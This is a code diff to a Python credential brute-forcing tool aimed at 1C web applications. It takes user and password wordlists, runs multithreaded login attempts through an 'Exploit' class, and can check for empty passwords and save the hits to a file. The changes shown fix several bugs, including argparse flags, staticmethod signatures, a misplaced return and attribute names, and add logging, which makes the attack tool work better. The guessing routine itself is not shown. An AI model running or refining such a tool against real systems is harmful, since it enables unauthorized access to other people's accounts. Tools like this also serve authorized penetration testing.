@@ -12,19 +12,21 @@ import dataclasses
 import logging
 
 logger = logging.getLogger(__name__)
+logging.basicConfig(level=logging.DEBUG)
 
 
 def parse_args() -> argparse:
     parser = argparse.ArgumentParser(
         description='Web Application Bruteforcer',
-        epilog='Example: py ./1c-web-bruter.py http://10.2.3.4/buh users.txt pass.txt'  # noqa
+        epilog='Example: py ./1c_brute.py <url> users.txt pass.txt'
         )
 
     parser.add_argument(
         'Target',
         metavar='target',
         type=str,
-        help='The target URI with directory of 1C webapp. Example: http://192.168.1.1/Tasker'  # noqa
+        help="The target URI with directory of 1C webapp."
+        "Example: http://192.168.1.1/docCorp"
     )
 
     parser.add_argument(
@@ -35,7 +37,7 @@ def parse_args() -> argparse:
     )
 
     parser.add_argument(
-        'Wordlist',
+        'Passwords',
         metavar='passwords',
         type=str,
         help='The passwords list'
@@ -64,7 +66,6 @@ def parse_args() -> argparse:
 
     parser.add_argument(
         "--check-empty-passwords",
-        type=bool,
         action="store_true",
         help="Check for users with empty passwords",
         default=False
@@ -72,7 +73,6 @@ def parse_args() -> argparse:
 
     parser.add_argument(
         "--save-results",
-        type=bool,
         action="store_true",
         help="Save results to file 'results.txt'",
         default=False
@@ -83,7 +83,7 @@ def parse_args() -> argparse:
     return args
 
 
-@dataclasses.dataclass
+@dataclasses.dataclass()
 class ExploitConfig(object):
     """
     """
@@ -101,7 +101,7 @@ class ExploitConfig(object):
     check_empty_passwords: bool = False
 
     reseturl: str = ""
-    resetdata: Dict[str] = ""
+    resetdata = {"root": "{}"}
 
     def __init__(
         self,
@@ -124,15 +124,15 @@ class ExploitConfig(object):
         self.version = version
 
         self.reseturl = f"{target}/{self.lang}/e1cib/logout"
-        self.resetdata = {'root': '{}'}
 
 
 class FileHandler(object):
     """
     Class for managing operations with text files
     """
+
     @staticmethod
-    def load(self, filename: str) -> List[str]:
+    def load(filename: str) -> List[str]:
         """
 
         :param filename: _description_
@@ -150,10 +150,11 @@ class FileHandler(object):
             logger.exception(
                 f"Failed to load data from file '{filename}': {e}"
             )
-            return data
+
+        return data
 
     @staticmethod
-    def save_line(self, filename: str, data: str):
+    def save_line(filename: str, data: str):
         """
 
         :param filename: _description_
@@ -263,12 +264,25 @@ class Exploit(object):
     def start_exploit(self):
         users = FileHandler.load(
             filename=self._config.usernames_file
-        )[self._config._startAt:]
+        )[self._config.startAt:]
+        if not users:
+            logging.error(
+                "[!] There is no users provided. Shutting down..."
+            )
+            sys.exit(0)
+
         passwords = []
         if not self._config.check_empty_passwords:
             passwords = FileHandler.load(filename=self._config.passwords_file)
 
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+        logger.info(
+            f"Number of users: {len(users)}"
+        )
+        logger.info(
+            f"Number of passwords: {len(passwords)}"
+        )
+
+        with ThreadPoolExecutor(max_workers=self._config.threads) as executor:
             futures = [
                 executor.submit(self._brute, user, password)
                 for user
@@ -297,7 +311,7 @@ def main():
     exploit = Exploit(
         target=args.Target,
         usernames_file=args.Username,
-        passwords_file=args.Password,
+        passwords_file=args.Passwords,
         startAt=args.startat,
         delay=args.delay / 1000,
         ignoreBadCerts=args.ignore_invalid_certificate,
